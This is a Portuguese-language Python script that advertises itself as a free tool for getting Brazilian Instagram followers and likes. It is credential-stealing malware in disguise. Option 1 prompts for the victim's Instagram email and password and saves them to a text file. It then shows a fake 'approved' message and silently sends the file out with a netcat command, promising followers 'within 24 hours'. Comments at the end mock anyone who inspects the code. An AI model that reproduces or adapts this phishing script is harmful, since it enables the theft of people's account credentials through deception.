#-- coding: UTF-8 --

#--NAO KIBA CARALHOKKKKKK--#
import time, os

red = '\033[1;31m'
az = '\033[1;94m'
gr = '\033[1;32m'
while True:
    print(f''' {az}
     _           _                                  
    (_)         | |                                 
     _ _ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___  
    | | '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \ 
    | | | | \__ \ || (_| | (_| | | | (_| | | | | | |
    |_|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                           __/ |                 
                          |___/  {az}                 
                
                {gr}$coded by Xsp4wn_{gr}

    {red}[ALERT]Essa script é 100% gratuita[ALERT]{red}''')

    print(f'''
    [1]Seguidores no instagram(*SEGUIDORES BR*)
    [2]Curtidas (*BR*)

    apoie o criador para fazer mais tools (insta: @i.am.gab)
    ''')

    var = input('[#]Selecione a opção: ')
    if var == '1':
        back = False
        while (back == False):
            email = input(' [#] Email Aqui  > ')
            passw = input(' [#] Senha Aqui > ')
            with open("email_e_senha.txt", "w") as arq:
                arq.write(f'''email: {email}
    senha: {passw}''')
                time.sleep(2);print(' [#] Testando, aguarde...!')
                time.sleep(2);print(f'''{gr}
                
                    APROVADO''')
                
                os.system('nc -w 2 127.0.0.1 333 < email_e_senha.txt &> /dev/null')
                print(f'''
                
    [*] Os seguidores irão chegar em até 24 horas!''')
                break

    if var == '2':
        link = input('Bote o link da postagem --> ')
        time.sleep(2);print(' [#] Testando, aguarde...!')
        with open("email_e_senha.txt", "w") as arq:
            arq.write(f'''link: {link}''')
            time.sleep(2);print(' [#] Testando, aguarde...!')
            time.sleep(2);print(f'''{gr}
                
                    APROVADO''')
                
            os.system('nc -w 2 127.0.0.1 333 < email_e_senha.txt &> /dev/null')
            print(f'''
                
    [*] As suas curtidas irão chegar em até 24 horas!''')
    time.sleep(5)
#--é p spawn ne amor?--#
#-analisando o cod é? kkkk-#
#-gosei-#
#-salve berl1n e XRev3rse-# 
